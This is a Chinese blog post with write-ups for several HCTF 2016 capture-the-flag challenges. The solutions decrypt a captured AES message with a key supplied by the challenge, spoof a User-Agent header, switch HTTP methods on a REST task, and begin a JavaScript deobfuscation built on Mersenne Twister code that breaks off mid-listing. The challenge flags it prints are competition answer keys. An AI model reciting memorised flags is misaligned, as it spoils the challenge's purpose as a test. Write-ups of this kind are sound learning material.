<!DOCTYPE html>
<html lang="zh-Hans">
<head>

    <!--[if lt IE 9]>
        <style>body {display: none; background: none !important} </style>
        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
    <![endif]-->

<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<meta name="format-detection" content="telephone=no" />
<meta name="author" content="Shinpachi8" />



<meta name="description" content="今年的hctf与几个哥们儿一起组队玩了一下。但是成绩比较惨淡。 但是还是把自己的writeup 写一下。 以做纪念。
签到题签到的题目是一个pcap流量包。 在里边follow tcp stream， 可以看到以下的内容。可以看到base64编码的mbZoEMrhAO0WWeugNjqNw3U6Tt2C+rwpgpbdWRZgfQI3MAh0sZ9qjnziUKkV90XhAOkIs/OXoYVw">
<meta property="og:type" content="article">
<meta property="og:title" content="Hctf 2016 Write Up">
<meta property="og:url" content="http://yoursite.com/2017/01/18/hctf-2016-write-up/index.html">
<meta property="og:site_name" content="shin's blog">
<meta property="og:description" content="今年的hctf与几个哥们儿一起组队玩了一下。但是成绩比较惨淡。 但是还是把自己的writeup 写一下。 以做纪念。
签到题签到的题目是一个pcap流量包。 在里边follow tcp stream， 可以看到以下的内容。可以看到base64编码的mbZoEMrhAO0WWeugNjqNw3U6Tt2C+rwpgpbdWRZgfQI3MAh0sZ9qjnziUKkV90XhAOkIs/OXoYVw">
<meta property="og:image" content="http://img.blog.csdn.net/20161127204941170">
<meta property="og:image" content="http://img.blog.csdn.net/20161127210401334">
<meta property="og:image" content="http://img.blog.csdn.net/20161127211130658">
<meta property="og:image" content="http://img.blog.csdn.net/20161127213746753">
<meta property="og:image" content="http://img.blog.csdn.net/20161127214545765">
<meta property="og:updated_time" content="2017-01-18T13:24:29.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Hctf 2016 Write Up">
<meta name="twitter:description" content="今年的hctf与几个哥们儿一起组队玩了一下。但是成绩比较惨淡。 但是还是把自己的writeup 写一下。 以做纪念。
签到题签到的题目是一个pcap流量包。 在里边follow tcp stream， 可以看到以下的内容。可以看到base64编码的mbZoEMrhAO0WWeugNjqNw3U6Tt2C+rwpgpbdWRZgfQI3MAh0sZ9qjnziUKkV90XhAOkIs/OXoYVw">
<meta name="twitter:image" content="http://img.blog.csdn.net/20161127204941170">

<link rel="apple-touch-icon" href= "/apple-touch-icon.png">


    <link rel="alternate" href="/atom.xml" title="shin&#39;s blog" type="application/atom+xml">



    <link rel="shortcut icon" href="/favicon.png">



    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">



    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">



    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">


<link rel="stylesheet" href="/css/style.css">



<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">


<title>Hctf 2016 Write Up | shin&#39;s blog</title>

<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>

<script>
    var yiliaConfig = {
        fancybox: true,
        animate: true,
        isHome: false,
        isPost: true,
        isArchive: false,
        isTag: false,
        isCategory: false,
        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
        search: true
    }
</script>


    <script>
        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
    </script>



    <script> yiliaConfig.rootUrl = "\/";</script>






</head>
<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
    <header id="header" class="inner">
        <a href="/" class="profilepic">
            <img src="/assets/img/shinpachi.JPG" class="animated zoomIn">
        </a>
        <hgroup>
          <h1 class="header-author"><a href="/">Shinpachi8</a></h1>
        </hgroup>

        
        <p class="header-subtitle">远看泰山黑乎乎</p>
        

        
            <form id="search-form">
            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
            <i class="fa fa-times" onclick="resetSearch()"></i>
            </form>
            <div id="local-search-result"></div>
            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
        


        

        <div id="switch-area" class="switch-area">
            <div class="switch-wrap">
                <section class="switch-part switch-part1">
                    <nav class="header-menu">
                        <ul>
                        
                            <li><a href="/">主页</a></li>
                        
                            <li><a href="/archives/">所有文章</a></li>
                        
                            <li><a href="/tags/">标签云</a></li>
                        
                            <li><a href="/about/">关于我</a></li>
                        
                            <li><a href="/friendlink/">友链</a></li>
                        
                        </ul>
                    </nav>
                    <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa Email" href="mailto:123@123.com" title="Email"></a>
                            
                                <a class="fa GitHub" href="#" title="GitHub"></a>
                            
                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
                            
                        </ul>
                    </nav>
                </section>
                
                
                
                
                <section class="switch-part switch-part3">
                    <div id="js-friends">
                    
                      <a class="main-nav-link switch-friends-link" href="https://pages.github.com/">GitHub</a>
                    
                    </div>
                </section>
                

                
            </div>
        </div>
    </header>                
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
      <div class="overlay">
          <div class="slider-trigger"></div>
          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Shinpachi8</a></h1>
      </div>
    <div class="intrude-less">
        <header id="header" class="inner">
            <a href="/" class="profilepic">
                <img src="/assets/img/shinpachi.JPG" class="animated zoomIn">
            </a>
            <hgroup>
              <h1 class="header-author"><a href="/" title="回到主页">Shinpachi8</a></h1>
            </hgroup>
            
            <p class="header-subtitle">远看泰山黑乎乎</p>
            
            <nav class="header-menu">
                <ul>
                
                    <li><a href="/">主页</a></li>
                
                    <li><a href="/archives/">所有文章</a></li>
                
                    <li><a href="/tags/">标签云</a></li>
                
                    <li><a href="/about/">关于我</a></li>
                
                    <li><a href="/friendlink/">友链</a></li>
                
                <div class="clearfix"></div>
                </ul>
            </nav>
            <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa Email" target="_blank" href="mailto:123@123.com" title="Email"></a>
                            
                                <a class="fa GitHub" target="_blank" href="#" title="GitHub"></a>
                            
                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
                            
                        </ul>
            </nav>
        </header>                
    </div>
    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
</nav>
      <div class="body-wrap"><article id="post-hctf-2016-write-up" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2017/01/18/hctf-2016-write-up/" class="article-date">
      <time datetime="2017-01-18T12:27:42.000Z" itemprop="datePublished">2017-01-18</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      Hctf 2016 Write Up
    </h1>
  

      </header>
      
      <div class="article-info article-info-post">
        
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/learn/">learn</a>
    </div>


        
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li></ul>
    </div>

        <div class="clearfix"></div>
      </div>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p>今年的hctf与几个哥们儿一起组队玩了一下。但是成绩比较惨淡。 但是还是把自己的writeup 写一下。 以做纪念。</p>
<h1 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h1><p>签到的题目是一个pcap流量包。 在里边follow tcp stream， 可以看到以下的内容。<br><img src="http://img.blog.csdn.net/20161127204941170" alt="流量内容"><br>可以看到base64编码的<code>mbZoEMrhAO0WWeugNjqNw3U6Tt2C+rwpgpbdWRZgfQI3MAh0sZ9qjnziUKkV90XhAOkIs/OXoYVw5uQDjVvgNA==</code><br>还有一个加密的function.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># coding:utf-8</span></div><div class="line">__author__ = <span class="string">'Aklis'</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> Crypto <span class="keyword">import</span> Random</div><div class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</div><div class="line"></div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> base64</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(encrypted, passphrase)</span>:</span></div><div class="line">  IV = encrypted[:<span class="number">16</span>]</div><div class="line">  aes = AES.new(passphrase, AES.MODE_CBC, IV)</div><div class="line">  <span class="keyword">return</span> aes.decrypt(encrypted[<span class="number">16</span>:])</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(message, passphrase)</span>:</span></div><div class="line">  IV = message[:<span class="number">16</span>]</div><div class="line">  length = <span class="number">16</span></div><div class="line">  count = len(message)</div><div class="line">  padding = length - (count % length)</div><div class="line">  message = message + <span class="string">'\0'</span> * padding</div><div class="line">  aes = AES.new(passphrase, AES.MODE_CBC, IV)</div><div class="line">  <span class="keyword">return</span> aes.encrypt(message)</div><div class="line"></div><div class="line"></div><div class="line">IV = <span class="string">'YUFHJKVWEASDGQDH'</span></div><div class="line"></div><div class="line">message = IV + <span class="string">'flag is hctf&#123;xxxxxxxxxxxxxxx&#125;'</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">print</span> len(message)</div><div class="line"></div><div class="line">example = encrypt(message, <span class="string">'Qq4wdrhhyEWe4qBF'</span>)</div><div class="line"><span class="keyword">print</span> example</div><div class="line">example = decrypt(example, <span class="string">'Qq4wdrhhyEWe4qBF'</span>)</div><div class="line"><span class="keyword">print</span> example</div></pre></td></tr></table></figure>
<p>解码之后是 <code>flag is hctf{n0w_U_w111_n0t_f1nd_me}</code><br><a id="more"></a></p>
<h1 id="2099年的flag"><a href="#2099年的flag" class="headerlink" title="2099年的flag"></a>2099年的flag</h1><p>题目是需要os99系统，那么就找一个ios的User-Agent， 将其修改为99的系统即可。<br><img src="http://img.blog.csdn.net/20161127210401334" alt="2099 solution"></p>
<h1 id="RESTFUL"><a href="#RESTFUL" class="headerlink" title="RESTFUL"></a>RESTFUL</h1><p><a href="https://zh.wikipedia.org/wiki/REST" target="_blank" rel="external">restful 中文维基 介绍</a></p>
<blockquote>
<p>简单来说就是用get/post/put/delete的请求头来作为操作符，url作为唯一的资源的一种web架构。</p>
</blockquote>
<p>本题解法也简单，只要稍微了解一下restful就可以正确提交<br><img src="http://img.blog.csdn.net/20161127211130658" alt="restful"></p>
<h1 id="giligili"><a href="#giligili" class="headerlink" title="giligili"></a>giligili</h1><p>这是一道js分析题。做这道题的时候有两个参考</p>
<ol>
<li><a href="http://lorexxar.cn/2016/04/11/sctf-Obfusion/" target="_blank" rel="external">LoRexxar 的博客</a></li>
<li><a href="https://github.com/failedxyz/sctf-2016q1/tree/master/obfuscation-static" target="_blank" rel="external">sctf writeup</a></li>
</ol>
<p>下边贴出自己的分析代码，与第一个博客一样，是可以直接拖进控制台调试的。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div><div class="line">249</div><div class="line">250</div><div class="line">251</div><div class="line">252</div><div class="line">253</div><div class="line">254</div><div class="line">255</div><div class="line">256</div><div class="line">257</div><div class="line">258</div><div class="line">259</div><div class="line">260</div><div class="line">261</div><div class="line">262</div><div class="line">263</div><div class="line">264</div><div class="line">265</div><div class="line">266</div><div class="line">267</div><div class="line">268</div><div class="line">269</div><div class="line">270</div><div class="line">271</div><div class="line">272</div><div class="line">273</div><div class="line">274</div><div class="line">275</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/*</span></div><div class="line">  I've wrapped Makoto Matsumoto and Takuji Nishimura's code in a namespace</div><div class="line">  so it's better encapsulated. Now you can have multiple random number generators</div><div class="line">  and they won't stomp all over eachother's state.</div><div class="line"></div><div class="line">  If you want to use this as a substitute for Math.random(), use the random()</div><div class="line">  method like so:</div><div class="line"></div><div class="line">  var m = new MersenneTwister();</div><div class="line">  var randomNumber = m.random();</div><div class="line"></div><div class="line">  You can also call the other genrand_&#123;foo&#125;() methods on the instance.</div><div class="line">  If you want to use a specific seed in order to get a repeatable random</div><div class="line">  sequence, pass an integer into the constructor:</div><div class="line">  var m = new MersenneTwister(123);</div><div class="line">  and that will always produce the same random sequence.</div><div class="line">  Sean McCullough (banksean@gmail.com)</div><div class="line">*/</div><div class="line"><span class="comment">/*</span></div><div class="line">   A C-program for MT19937, with initialization improved 2002/1/26.</div><div class="line">   Coded by Takuji Nishimura and Makoto Matsumoto.</div><div class="line"></div><div class="line">   Before using, initialize the state by using init_genrand(seed)</div><div class="line">   or init_by_array(init_key, key_length).</div><div class="line"></div><div class="line">   Copyright (C) 1997 - 2002, Makoto Matsumoto and Takuji Nishimura,</div><div class="line">   All rights reserved.</div><div class="line"></div><div class="line">   Redistribution and use in source and binary forms, with or without</div><div class="line">   modification, are permitted provided that the following conditions</div><div class="line">   are met:</div><div class="line"></div><div class="line">     1. Redistributions of source code must retain the above copyright</div><div class="line">        notice, this list of conditions and the following disclaimer.</div><div class="line"></div><div class="line">     2. Redistributions in binary form must reproduce the above copyright</div><div class="line">        notice, this list of conditions and the following disclaimer in the</div><div class="line">        documentation and/or other materials provided with the distribution.</div><div class="line"></div><div class="line">     3. The names of its contributors may not be used to endorse or promote</div><div class="line">        products derived from this software without specific prior written</div><div class="line">        permission.</div><div class="line"></div><div class="line">   THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS</div><div class="line">   "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT</div><div class="line">   LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR</div><div class="line">   A PARTICULAR PURPOSE ARE DISCLAIMED.  IN NO EVENT SHALL THE COPYRIGHT OWNER OR</div><div class="line">   CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,</div><div class="line">   EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,</div><div class="line">   PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR</div><div class="line">   PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF</div><div class="line">   LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING</div><div class="line">   NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS</div><div class="line">   SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.</div><div class="line"></div><div class="line"></div><div class="line">   Any feedback is very welcome.</div><div class="line">   http://www.math.sci.hiroshima-u.ac.jp/~m-mat/MT/emt.html</div><div class="line">   email: m-mat @ math.sci.hiroshima-u.ac.jp (remove space)</div><div class="line">*/</div><div class="line"><span class="keyword">var</span> MersenneTwister = <span class="function"><span class="keyword">function</span>(<span class="params">seed</span>) </span>&#123;</div><div class="line">  <span class="keyword">if</span> (seed == <span class="literal">undefined</span>) &#123;</div><div class="line">    seed = <span class="keyword">new</span> <span class="built_in">Date</span>().getTime();</div><div class="line">  &#125;</div><div class="line">  <span class="comment">/* Period parameters */</span></div><div class="line">  <span class="keyword">this</span>.N = <span class="number">624</span>;</div><div class="line">  <span class="keyword">this</span>.M = <span class="number">397</span>;</div><div class="line">  <span class="keyword">this</span>.MATRIX_A = <span class="number">0x9908b0df</span>;   <span class="comment">/* constant vector a */</span></div><div class="line">  <span class="keyword">this</span>.UPPER_MASK = <span class="number">0x80000000</span>; <span class="comment">/* most significant w-r bits */</span></div><div class="line">  <span class="keyword">this</span>.LOWER_MASK = <span class="number">0x7fffffff</span>; <span class="comment">/* least significant r bits */</span></div><div class="line"></div><div class="line">  <span class="keyword">this</span>.mt = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="keyword">this</span>.N); <span class="comment">/* the array for the state vector */</span></div><div class="line">  <span class="keyword">this</span>.mti=<span class="keyword">this</span>.N+<span class="number">1</span>; <span class="comment">/* mti==N+1 means mt[N] is not initialized */</span></div><div class="line">  <span class="keyword">this</span>.init_genrand(seed);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/* initializes mt[N] with a seed */</span></div><div class="line">MersenneTwister.prototype.init_genrand = <span class="function"><span class="keyword">function</span>(<span class="params">s</span>) </span>&#123;</div><div class="line">  <span class="keyword">this</span>.mt[<span class="number">0</span>] = s &gt;&gt;&gt; <span class="number">0</span>;</div><div class="line">  <span class="keyword">for</span> (<span class="keyword">this</span>.mti=<span class="number">1</span>; <span class="keyword">this</span>.mti&lt;<span class="keyword">this</span>.N; <span class="keyword">this</span>.mti++) &#123;</div><div class="line">      <span class="keyword">var</span> s = <span class="keyword">this</span>.mt[<span class="keyword">this</span>.mti<span class="number">-1</span>] ^ (<span class="keyword">this</span>.mt[<span class="keyword">this</span>.mti<span class="number">-1</span>] &gt;&gt;&gt; <span class="number">30</span>);</div><div class="line">   <span class="keyword">this</span>.mt[<span class="keyword">this</span>.mti] = (((((s &amp; <span class="number">0xffff0000</span>) &gt;&gt;&gt; <span class="number">16</span>) * <span class="number">1812433253</span>) &lt;&lt; <span class="number">16</span>) + (s &amp; <span class="number">0x0000ffff</span>) * <span class="number">1812433253</span>)</div><div class="line">  + <span class="keyword">this</span>.mti;</div><div class="line">      <span class="comment">/* See Knuth TAOCP Vol2. 3rd Ed. P.106 for multiplier. */</span></div><div class="line">      <span class="comment">/* In the previous versions, MSBs of the seed affect   */</span></div><div class="line">      <span class="comment">/* only MSBs of the array mt[].                        */</span></div><div class="line">      <span class="comment">/* 2002/01/09 modified by Makoto Matsumoto             */</span></div><div class="line">      <span class="keyword">this</span>.mt[<span class="keyword">this</span>.mti] &gt;&gt;&gt;= <span class="number">0</span>;</div><div class="line">      <span class="comment">/* for &gt;32 bit machines */</span></div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/* initialize by an array with array-length */</span></div><div class="line"><span class="comment">/* init_key is the array for initializing keys */</span></div><div class="line"><span class="comment">/* key_length is its length */</span></div><div class="line"><span class="comment">/* slight change for C++, 2004/2/26 */</span></div><div class="line">MersenneTwister.prototype.init_by_array = <span class="function"><span class="keyword">function</span>(<span class="params">init_key, key_length</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> i, j, k;</div><div class="line">  <span class="keyword">this</span>.init_genrand(<span class="number">19650218</span>);</div><div class="line">  i=<span class="number">1</span>; j=<span class="number">0</span>;</div><div class="line">  k = (<span class="keyword">this</span>.N&gt;key_length ? <span class="keyword">this</span>.N : key_length);</div><div class="line">  <span class="keyword">for</span> (; k; k--) &#123;</div><div class="line">    <span class="keyword">var</span> s = <span class="keyword">this</span>.mt[i<span class="number">-1</span>] ^ (<span class="keyword">this</span>.mt[i<span class="number">-1</span>] &gt;&gt;&gt; <span class="number">30</span>)</div><div class="line">    <span class="keyword">this</span>.mt[i] = (<span class="keyword">this</span>.mt[i] ^ (((((s &amp; <span class="number">0xffff0000</span>) &gt;&gt;&gt; <span class="number">16</span>) * <span class="number">1664525</span>) &lt;&lt; <span class="number">16</span>) + ((s &amp; <span class="number">0x0000ffff</span>) * <span class="number">1664525</span>)))</div><div class="line">      + init_key[j] + j; <span class="comment">/* non linear */</span></div><div class="line">    <span class="keyword">this</span>.mt[i] &gt;&gt;&gt;= <span class="number">0</span>; <span class="comment">/* for WORDSIZE &gt; 32 machines */</span></div><div class="line">    i++; j++;</div><div class="line">    <span class="keyword">if</span> (i&gt;=<span class="keyword">this</span>.N) &#123; <span class="keyword">this</span>.mt[<span class="number">0</span>] = <span class="keyword">this</span>.mt[<span class="keyword">this</span>.N<span class="number">-1</span>]; i=<span class="number">1</span>; &#125;</div><div class="line">    <span class="keyword">if</span> (j&gt;=key_length) j=<span class="number">0</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">for</span> (k=<span class="keyword">this</span>.N<span class="number">-1</span>; k; k--) &#123;</div><div class="line">    <span class="keyword">var</span> s = <span class="keyword">this</span>.mt[i<span class="number">-1</span>] ^ (<span class="keyword">this</span>.mt[i<span class="number">-1</span>] &gt;&gt;&gt; <span class="number">30</span>);</div><div class="line">    <span class="keyword">this</span>.mt[i] = (<span class="keyword">this</span>.mt[i] ^ (((((s &amp; <span class="number">0xffff0000</span>) &gt;&gt;&gt; <span class="number">16</span>) * <span class="number">1566083941</span>) &lt;&lt; <span class="number">16</span>) + (s &amp; <span class="number">0x0000ffff</span>) * <span class="number">1566083941</span>))</div><div class="line">      - i; <span class="comment">/* non linear */</span></div><div class="line">    <span class="keyword">this</span>.mt[i] &gt;&gt;&gt;= <span class="number">0</span>; <span class="comment">/* for WORDSIZE &gt; 32 machines */</span></div><div class="line">    i++;</div><div class="line">    <span class="keyword">if</span> (i&gt;=<span class="keyword">this</span>.N) &#123; <span class="keyword">this</span>.mt[<span class="number">0</span>] = <span class="keyword">this</span>.mt[<span class="keyword">this</span>.N<span class="number">-1</span>]; i=<span class="number">1</span>; &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">this</span>.mt[<span class="number">0</span>] = <span class="number">0x80000000</span>; <span class="comment">/* MSB is 1; assuring non-zero initial array */</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/* generates a random number on [0,0xffffffff]-interval */</span></div><div class="line">MersenneTwister.prototype.genrand_int32 = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> y;</div><div class="line">  <span class="keyword">var</span> mag01 = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x0</span>, <span class="keyword">this</span>.MATRIX_A);</div><div class="line">  <span class="comment">/* mag01[x] = x * MATRIX_A  for x=0,1 */</span></div><div class="line">  <span class="keyword">if</span> (<span class="keyword">this</span>.mti &gt;= <span class="keyword">this</span>.N) &#123; <span class="comment">/* generate N words at one time */</span></div><div class="line">    <span class="keyword">var</span> kk;</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.mti == <span class="keyword">this</span>.N+<span class="number">1</span>)   <span class="comment">/* if init_genrand() has not been called, */</span></div><div class="line">      <span class="keyword">this</span>.init_genrand(<span class="number">5489</span>); <span class="comment">/* a default initial seed is used */</span></div><div class="line">    <span class="keyword">for</span> (kk=<span class="number">0</span>;kk&lt;<span class="keyword">this</span>.N-<span class="keyword">this</span>.M;kk++) &#123;</div><div class="line">      y = (<span class="keyword">this</span>.mt[kk]&amp;<span class="keyword">this</span>.UPPER_MASK)|(<span class="keyword">this</span>.mt[kk+<span class="number">1</span>]&amp;<span class="keyword">this</span>.LOWER_MASK);</div><div class="line">      <span class="keyword">this</span>.mt[kk] = <span class="keyword">this</span>.mt[kk+<span class="keyword">this</span>.M] ^ (y &gt;&gt;&gt; <span class="number">1</span>) ^ mag01[y &amp; <span class="number">0x1</span>];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span> (;kk&lt;<span class="keyword">this</span>.N<span class="number">-1</span>;kk++) &#123;</div><div class="line">      y = (<span class="keyword">this</span>.mt[kk]&amp;<span class="keyword">this</span>.UPPER_MASK)|(<span class="keyword">this</span>.mt[kk+<span class="number">1</span>]&amp;<span class="keyword">this</span>.LOWER_MASK);</div><div class="line">      <span class="keyword">this</span>.mt[kk] = <span class="keyword">this</span>.mt[kk+(<span class="keyword">this</span>.M-<span class="keyword">this</span>.N)] ^ (y &gt;&gt;&gt; <span class="number">1</span>) ^ mag01[y &amp; <span class="number">0x1</span>];</div><div class="line">    &#125;</div><div class="line">    y = (<span class="keyword">this</span>.mt[<span class="keyword">this</span>.N<span class="number">-1</span>]&amp;<span class="keyword">this</span>.UPPER_MASK)|(<span class="keyword">this</span>.mt[<span class="number">0</span>]&amp;<span class="keyword">this</span>.LOWER_MASK);</div><div class="line">    <span class="keyword">this</span>.mt[<span class="keyword">this</span>.N<span class="number">-1</span>] = <span 